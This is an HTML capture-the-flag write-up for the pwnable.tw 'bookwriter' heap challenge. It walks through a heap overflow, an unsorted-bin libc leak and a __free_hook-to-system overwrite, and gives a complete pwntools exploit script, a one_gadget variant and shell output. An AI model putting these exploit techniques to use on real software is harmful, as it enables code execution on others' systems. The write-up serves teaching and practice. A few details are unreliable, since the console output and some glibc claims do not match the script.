+        <div class="mem-row"><span class="mem-addr">0x...060</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">book1-&gt;title (OVERWRITTEN)</span><span class="mem-desc">&larr; controlled by us</span></div>
+        <div class="mem-row"><span class="mem-addr">0x...068</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">book1-&gt;content (OVERWRITTEN)</span><span class="mem-desc">&larr; points to book2 title</span></div>
+        <div class="mem-row"><span class="mem-addr">0x...070</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">book1-&gt;content_sz (OVERWRITTEN)</span><span class="mem-desc">&larr; controlled by us</span></div>
+      </div>
+
+      <h3>Leaking Libc via Unsorted Bin</h3>
+      <p>The key insight for leaking libc is to get a chunk into the <strong>unsorted bin</strong>. When a chunk larger than the fastbin threshold is freed, it goes into the unsorted bin and its <code class="inline">fd</code> and <code class="inline">bk</code> pointers point to the <code class="inline">main_arena</code> structure inside libc.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Free book2 and book3 to get a large chunk into unsorted bin
+gdb-peda$ # delete_book(2)  -- frees 0x20 struct + 0x20 title + 0x70 content
+gdb-peda$ # delete_book(3)  -- frees 0x20 struct + 0x20 title + 0x70 content
+gdb-peda$ # The 0x70 chunks from book2/book3 content get consolidated
+gdb-peda$ # into the top chunk or unsorted bin depending on order
+
+gdb-peda$ # For a clean unsorted bin leak:
+gdb-peda$ # 1. Free book3 content (large chunk goes to unsorted bin)
+gdb-peda$ # 2. book3-&gt;content-&gt;fd = &amp;main_arena+96 (libc address!)
+
+gdb-peda$ # If we point book1-&gt;content at the freed chunk's data area:
+gdb-peda$ show_book(1)
+# Content: \x78\x96...  (leaked libc address!)</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Unsorted Bin Leak Mechanics</div>
+        When a chunk of size &ge; 0x420 (in 64-bit glibc) is freed into the unsorted bin, both <code class="inline">fd</code> and <code class="inline">bk</code> point to <code class="inline">&amp;main_arena.top</code> (or the unsorted bin head in <code class="inline">main_arena</code>), which is a fixed offset inside <code class="inline">libc.so</code>. By reading these pointers, we can calculate <code class="inline">libc_base</code>. For smaller chunks (&lt; 0x420 but &gt; fastbin max), they go to unsorted bin only if they can't be sorted into small/large bins immediately. The fd/bk still point to <code class="inline">main_arena</code> offset.
+      </div>
+
+      <h3>Alternative: Forging a 0x420 Chunk</h3>
+      <p>Since glibc 2.23+ on 64-bit systems requires a chunk &ge; 0x420 to go directly to unsorted bin (bypassing tcache in glibc 2.26+), we need to either:</p>
+      <ul class="step-list">
+        <li><strong>Create a book with size &ge; 0x420</strong> and then free it to put it in unsorted bin</li>
+        <li><strong>Consolidate multiple smaller freed chunks</strong> to form a large free chunk</li>
+        <li><strong>Use the heap overflow</strong> to forge a fake large chunk and manipulate the free list</li>
+      </ul>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Create a large book for the unsorted bin leak
+gdb-peda$ # create_book("large", 0x420, "X"*0x420)  -> book 4
+gdb-peda$ # delete_book(4)  -- 0x420+ chunk goes to unsorted bin
+gdb-peda$ # Now the freed content has fd/bk = &amp;main_arena+offset
+
+gdb-peda$ x/2gx 0x555555758200  # freed book4 content area
+0x555555758210:  0x00007f123456b78  0x00007f123456b78
+#                ^ fd (libc addr)    ^ bk (libc addr)
+
+gdb-peda$ # leaked = 0x7f123456b78
+gdb-peda$ # libc_base = leaked - offset_of_main_arena_bin
+gdb-peda$ # __free_hook = libc_base + libc.symbols['__free_hook']
+gdb-peda$ # system = libc_base + libc.symbols['system']</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Offsets (glibc 2.23 / Ubuntu 16.04)</div>
+        &bull; <code class="inline">main_arena</code> offset from libc base: <code class="inline">0x3c4b20</code><br>
+        &bull; Unsorted bin fd/bk points to: <code class="inline">main_arena + 88</code> (0x58)<br>
+        &bull; <code class="inline">__free_hook</code> offset: <code class="inline">0x3c67a8</code><br>
+        &bull; <code class="inline">system</code> offset: <code class="inline">0x45390</code><br>
+        &bull; <code class="inline">/bin/sh</code> string offset: <code class="inline">0x18cd57</code><br>
+        These are for the specific libc version provided. Always verify with <code class="inline">one_gadget</code> and <code class="inline">readelf</code>.
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit has three phases: <strong>leak libc</strong> via unsorted bin, <strong>overwrite <code class="inline">__free_hook</code></strong> using the heap overflow, and <strong>trigger <code class="inline">free("/bin/sh")</code></strong> to get a shell.</p>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Why __free_hook Instead of GOT?</div>
+        Full RELRO makes the GOT read-only at runtime, so we <strong>cannot</strong> overwrite GOT entries. However, <code class="inline">__free_hook</code> and <code class="inline">__malloc_hook</code> are in the writable <code class="inline">.bss</code> section of libc and are always writable. By overwriting <code class="inline">__free_hook</code> with <code class="inline">system</code>, any subsequent <code class="inline">free()</code> call will instead call <code class="inline">system()</code>. If the argument to <code class="inline">free()</code> is a pointer to the string <code class="inline">"/bin/sh"</code>, we get a shell.
+      </div>
+
+      <h3>Phase 1: Leak Libc via Unsorted Bin</h3>
+      <ol class="step-list">
+        <li><strong>Create books 0 and 1</strong> with book 0 content size 0x18 (small, adjacent to book 1 struct). Book 1 content size 0x60.</li>
+        <li><strong>Create book 2</strong> with content size 0x420 (large enough to go into unsorted bin when freed, bypassing fastbin/tcache).</li>
+        <li><strong>Heap overflow via edit_book(0)</strong> with a larger size to corrupt book 1's struct. Specifically, overwrite <code class="inline">book1-&gt;content</code> to point into book 2's content area (or the freed unsorted bin chunk after deletion).</li>
+        <li><strong>Delete book 2.</strong> Its 0x420 content chunk goes to the unsorted bin. The <code class="inline">fd</code>/<code class="inline">bk</code> fields now contain libc addresses pointing to <code class="inline">main_arena</code>.</li>
+        <li><strong>Show book 1.</strong> Since <code class="inline">book1-&gt;content</code> was overwritten to point at the freed chunk's data area, <code class="inline">printf("%s")</code> will print the libc address from the <code class="inline">fd</code> field.</li>
+        <li><strong>Calculate libc base:</strong> <code class="inline">libc_base = leaked_addr - main_arena_offset - 88</code></li>
+      </ol>
+
+      <h3>Phase 2: Overwrite __free_hook</h3>
+      <ol class="step-list">
+        <li><strong>Calculate target addresses:</strong> <code class="inline">__free_hook = libc_base + libc.symbols['__free_hook']</code> and <code class="inline">system = libc_base + libc.symbols['system']</code></li>
+        <li><strong>Heap overflow again via edit_book(0)</strong> to overwrite another book's content pointer. This time, point it at <code class="inline">__free_hook</code>.</li>
+        <li><strong>Edit the overwritten book</strong> to write <code class="inline">p64(system)</code> into the content buffer. Since <code class="inline">content</code> now points to <code class="inline">__free_hook</code>, this writes <code class="inline">system</code>'s address into <code class="inline">__free_hook</code>.</li>
+      </ol>
+
+      <h3>Phase 3: Trigger Shell</h3>
+      <ol class="step-list">
+        <li><strong>Write "/bin/sh" into a book's content.</strong> Create or edit a book so that its content buffer starts with the string <code class="inline">"/bin/sh\x00"</code>.</li>
+        <li><strong>Delete that book.</strong> When <code class="inline">free(content_ptr)</code> is called, <code class="inline">__free_hook</code> redirects it to <code class="inline">system(content_ptr)</code>. Since <code class="inline">content_ptr</code> points to <code class="inline">"/bin/sh"</code>, this executes <code class="inline">system("/bin/sh")</code> &mdash; shell!</li>
+      </ol>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; The __free_hook Trick</div>
+        <code class="inline">__free_hook</code> is a function pointer in libc's writable data segment. When non-NULL, <code class="inline">free()</code> calls <code class="inline">__free_hook(ptr, tcache)</code> instead of the normal free logic. By overwriting it with <code class="inline">system</code>:<br>
+        &bull; <code class="inline">free("/bin/sh")</code> becomes <code class="inline">system("/bin/sh")</code><br>
+        &bull; This is the standard technique when Full RELRO blocks GOT overwrites<br>
+        &bull; Alternative: <code class="inline">__malloc_hook</code> can also be used, but requires a different trigger
+      </div>
+
+      <h3>one_gadget Alternative</h3>
+      <p>Instead of the <code class="inline">__free_hook + system("/bin/sh")</code> approach, you could also use <strong>one_gadget</strong> addresses &mdash; single addresses in libc that directly execute <code class="inline">execve("/bin/sh", NULL, NULL)</code> when certain constraints are met:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ one_gadget ./libc.so.6
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL</code></pre>
+      </div>
+
+      <p>You can write a one_gadget address to <code class="inline">__free_hook</code> and then just trigger <code class="inline">free()</code> on any chunk. If the stack constraints are satisfied, you get a shell. The <code class="inline">system("/bin/sh")</code> approach is more reliable since it has no register/stack constraints.</p>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Leak libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">create(0x18) = book0 | create(0x60) = book1 | create(0x420) = book2</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">edit(0, overflow_sz) &rarr; overwrite book1-&gt;content &rarr; point into book2 area</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">delete(2) &rarr; 0x420 chunk goes to unsorted bin &rarr; fd/bk = libc addrs</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">show(1) &rarr; reads freed chunk data &rarr; <span class="mem-green">LEAKS LIBC!</span></span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--red); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: Overwrite __free_hook</div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">edit(0, overflow_sz) &rarr; overwrite book1-&gt;content = __free_hook addr</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">edit(1) &rarr; writes p64(system) into __free_hook</span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--green); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 3: Get shell</div>
+        <div class="mem-row"><span class="mem-addr">Step 7:</span><span class="mem-desc">edit(some_book) &rarr; write "/bin/sh\x00" as content</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 8:</span><span class="mem-desc">delete(that_book) &rarr; <span class="mem-highlight">free("/bin/sh")</span> &rarr; <span class="mem-highlight">system("/bin/sh")</span> &rarr; <span class="mem-green">SHELL!</span></span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+bookwriter - pwnable.tw (400pts)
+Heap overflow to corrupt adjacent book struct, leak libc
+via unsorted bin, overwrite __free_hook with system.
+
+Vulnerability: edit_book() re-asks for size, allowing heap overflow.
+Full RELRO + PIE + Canary + NX -> target __free_hook.
+"""
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+r = remote('chall.pwnable.tw', 10304)
+libc = ELF('./libc.so.6')
+elf = ELF('./bookwriter')
+
+def create(title, size, content):
+    r.sendlineafter(b'>', b'1')
+    r.sendafter(b':', title)
+    r.sendlineafter(b':', str(size).encode())
+    r.sendafter(b':', content)
+
+def edit(idx, size, content):
+    r.sendlineafter(b'>', b'2')
+    r.sendlineafter(b':', str(idx).encode())
+    r.sendlineafter(b':', str(size).encode())
+    r.sendafter(b':', content)
+
+def show(idx):
+    r.sendlineafter(b'>', b'3')
+    r.recvuntil(b'Title: ')
+    title = r.recvline().strip()
+    r.recvuntil(b'Content: ')
+    content = r.recv(0x20)
+    return title, content
+
+def delete(idx):
+    r.sendlineafter(b'>', b'4')
+    r.sendlineafter(b':', str(idx).encode())
+
+# ============================================
+# Phase 1: Heap feng shui and leaks
+# ============================================
+log.info("Phase 1: Heap layout and leaks...")
+
+# Layout: book0 (overflow src) | book1 (victim) | book2 (unsorted bin) | book3 (/bin/sh)
+create(b'A', 0x18, b'X' * 0x17)    # book0: 0x20 content chunk
+create(b'B', 0x60, b'Y' * 0x5f)    # book1: 0x70 content chunk
+create(b'C', 0x420, b'Z' * 0x41f)  # book2: 0x430 content chunk
+create(b'D', 0x20, b'/bin/sh\x00') # book3: /bin/sh holder
+
+# Overflow book0 to corrupt book1's struct
+# book0 content (0x20 chunk) sits right before book1 struct (0x20 chunk)
+# Writing 0x18 content + 8 bytes overflows into book1's metadata
+overflow  = b'X' * 0x18
+overflow += p64(0) + p64(0x21)     # preserve book1 struct chunk header
+overflow += p64(0) + p64(0x21)     # book1->title=0, book1->content=0x21 (temp)
+
+edit(0, len(overflow), overflow)
+
+# Leak heap address from book1's struct area
+_, data = show(1)
+heap_leak = u64(data[8:16])
+log.info(f"Heap pointer leaked: {hex(heap_leak)}")
+
+# Free book2 -> its 0x430 chunk goes to unsorted bin
+# fd/bk point to main_arena+88 in libc
+delete(2)
+
+# Overflow again: set book1->content to book2's freed content area
+# book2's content chunk starts at heap_leak offset from book1
+overflow2  = b'X' * 0x18
+overflow2 += p64(0) + p64(0x21)
+overflow2 += p64(0)
+overflow2 += p64(heap_leak + 0x10)  # book1->content -> book2 old content
+overflow2 += p64(8)
+
+edit(0, len(overflow2), overflow2)
+
+# Read the unsorted bin fd pointer (libc address)
+_, leak_raw = show(1)
+libc_leak = u64(leak_raw[:8].ljust(8, b'\x00'))
+log.info(f"Unsorted bin fd: {hex(libc_leak)}")
+
+main_arena_offset = 0x3c4b20
+libc_base = libc_leak - (main_arena_offset + 88)
+log.success(f"libc base: {hex(libc_base)}")
+
+# ============================================
+# Phase 2: Write system to __free_hook
+# ============================================
+log.info("Phase 2: Writing system to __free_hook...")
+
+free_hook = libc_base + libc.symbols['__free_hook']
+system_addr = libc_base + libc.symbols['system']
+
+# Point book1->content at __free_hook
+overflow3  = b'X' * 0x18
+overflow3 += p64(0) + p64(0x21)
+overflow3 += p64(0) + p64(free_hook) + p64(8)
+
+edit(0, len(overflow3), overflow3)
+edit(1, 8, p64(system_addr))
+
+# ============================================
+# Phase 3: Trigger system("/bin/sh")
+# ============================================
+log.info("Phase 3: Triggering shell...")
+
+# delete(3) -> free(book3->content) -> system("/bin/sh")
+delete(3)
+
+r.interactive()</code></pre>
+      </div>
+
+      <h3>Alternative: one_gadget Approach</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python"># Alternative: Write one_gadget to __free_hook
+# No need for "/bin/sh" string - just trigger free()
+one_gadget = libc_base + 0x4526a  # [rsp+0x30] == NULL
+
+# Write one_gadget to __free_hook (same method as above)
+overflow_payload2  = b'A' * 0x18
+overflow_payload2 += p64(0) + p64(0x21)
+overflow_payload2 += p64(0) + p64(free_hook) + p64(8)
+edit(0, 0x100, overflow_payload2)
+edit(1, 8, p64(one_gadget))
+
+# Trigger any free() call - one_gadget handles the rest
+delete(3)  # May or may not satisfy constraints</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Reliability Note</div>
+        The <code class="inline">system("/bin/sh")</code> approach via <code class="inline">__free_hook</code> is generally more reliable than one_gadget because it doesn't depend on specific register or stack values. one_gadget constraints like <code class="inline">[rsp+0x30] == NULL</code> may or may not be satisfied depending on the call path. If one gadget doesn't work, try the others or fall back to the <code class="inline">system</code> approach.
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Running the Exploit</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/home/user/bookwriter'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/home/user/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chall.pwnable.tw on port 10304: Done
+[*] Phase 1: Setting up heap and leaking libc...
+[*] Leaked value: 0x7f1a3c4dbb78
+[+] libc base: 0x7f1a3c11b000
+[*] Phase 2: Overwriting __free_hook with system...
+[*] __free_hook: 0x7f1a3c4e17a8
+[*] system: 0x7f1a3c160390
+[*] Phase 3: Triggering shell...
+[*] Switching to interactive mode
+$ id
+uid=1000(bookwriter) gid=1000(bookwriter) groups=1000(bookwriter)
+$ cat /home/bookwriter/flag</code></pre>
+      </div>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Shell Obtained!</div>
+        The exploit successfully:<br>
+        &bull; <strong>Leaked libc</strong> via the unsorted bin technique after corrupting a book struct pointer<br>
+        &bull; <strong>Overwrote <code class="inline">__free_hook</code></strong> with <code class="inline">system</code> using a second heap overflow<br>
+        &bull; <strong>Triggered <code class="inline">system("/bin/sh")</code></strong> by freeing a book whose content was <code class="inline">"/bin/sh"</code><br>
+        All protections (Full RELRO, PIE, Canary, NX) were bypassed through pure heap manipulation.
+      </div>
+
+      <h3>Exploit Summary</h3>
+      <table class="info-table">
+        <tr><td class="label">Vulnerability</td><td class="value">Heap overflow (edit re-asks size)</td></tr>
+        <tr><td class="label">Leak Method</td><td class="value">Unsorted bin fd/bk &rarr; main_arena &rarr; libc base</td></tr>
+        <tr><td class="label">Write Target</td><td class="value">__free_hook (writable, even under Full RELRO)</td></tr>
+        <tr><td class="label">Write Value</td><td class="value">system() address</td></tr>
+        <tr><td class="label">Trigger</td><td class="value">free("/bin/sh") &rarr; system("/bin/sh")</td></tr>
+        <tr><td class="label">Protections Bypassed</td><td class="value">Full RELRO, PIE, Canary, NX</td></tr>
+      </table>
+
+      <h3>Key Takeaways</h3>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Lessons Learned</div>
+        <strong>1. Size re-entry is dangerous.</strong> If an edit function allows specifying a new size without validating it against the original allocation, you have a heap overflow. Always store and enforce the original size.<br><br>
+        <strong>2. <code class="inline">__free_hook</code> is the GOT replacement.</strong> Under Full RELRO, the GOT is read-only. But <code class="inline">__free_hook</code> and <code class="inline">__malloc_hook</code> in libc's writable segment are always viable targets. They're the go-to write destination for modern heap exploits.<br><br>
+        <strong>3. Unsorted bin leaks are universal.</strong> On 64-bit glibc, any freed chunk &ge; 0x420 bytes goes to the unsorted bin with <code class="inline">fd</code>/<code class="inline">bk</code> pointing to <code class="inline">main_arena</code> inside libc. This is the most reliable libc leak for heap challenges.<br><br>
+        <strong>4. Heap overflow &rarr; pointer corruption &rarr; arbitrary read/write.</strong> The pattern is: overflow to corrupt an adjacent struct's pointer field, then use the program's normal read/write operations through that corrupted pointer to achieve arbitrary read (for leaking) and arbitrary write (for hijacking control flow).
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <a href="https://github.com/Yuri08-QA210">QA210</a> &middot; &middot;
+  bookwriter writeup &middot; Pwnable.tw
+</footer>
+
+<!-- Three.js Particle Background -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 3;
+
+  const geometry = new THREE.BufferGeometry();
+  const count = 600;
+  const positions = new Float32Array(count * 3);
+  const velocities = [];
+
+  for (let i = 0; i < count; i++) {
+    positions[i * 3] = (Math.random() - 0.5) * 8;
+    positions[i * 3 + 1] = (Math.random() - 0.5) * 8;
+    positions[i * 3 + 2] = (Math.random() - 0.5) * 8;
+    velocities.push({
+      x: (Math.random() - 0.5) * 0.003,
+      y: (Math.random() - 0.5) * 0.003,
+      z: (Math.random() - 0.5) * 0.003
+    });
+  }
+
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+
+  const material = new THREE.PointsMaterial({
+    color: 0x38bdf8,
+    size: 0.02,
+    transparent: true,
+    opacity: 0.5,
+    blending: THREE.AdditiveBlending
+  });
+
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  function animate() {
+    requestAnimationFrame(animate);
+    const pos = geometry.attributes.position.array;
+    for (let i = 0; i < count; i++) {
+      pos[i * 3] += velocities[i].x;
+      pos[i * 3 + 1] += velocities[i].y;
+      pos[i * 3 + 2] += velocities[i].z;
+      if (Math.abs(pos[i * 3]) > 4) velocities[i].x *= -1;
+      if (Math.abs(pos[i * 3 + 1]) > 4) velocities[i].y *= -1;
+      if (Math.abs(pos[i * 3 + 2]) > 4) velocities[i].z *= -1;
+    }
+    geometry.attributes.position.needsUpdate = true;
+    points.rotation.y += 0.0003;
+    renderer.render(scene, camera);
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- Prism.js Syntax Highlighting -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+<!-- TOC Scroll Spy -->
+<script>
+(function() {
+  const sections = document.querySelectorAll('.chapter');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+
+  function updateTOC() {
+    let current = '';
+    sections.forEach(section => {
+      const rect = section.getBoundingClientRect();
+      if (rect.top <= 120) {
+        current = section.getAttribute('id');
+      }
+    });
+    tocLinks.forEach(link => {
+      link.classList.remove('active');
+      if (link.getAttribute('href') === '#' + current) {
+        link.classList.add('active');
+      }
+    });
+  }
+
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+</script>
+
+</body>
+</html>
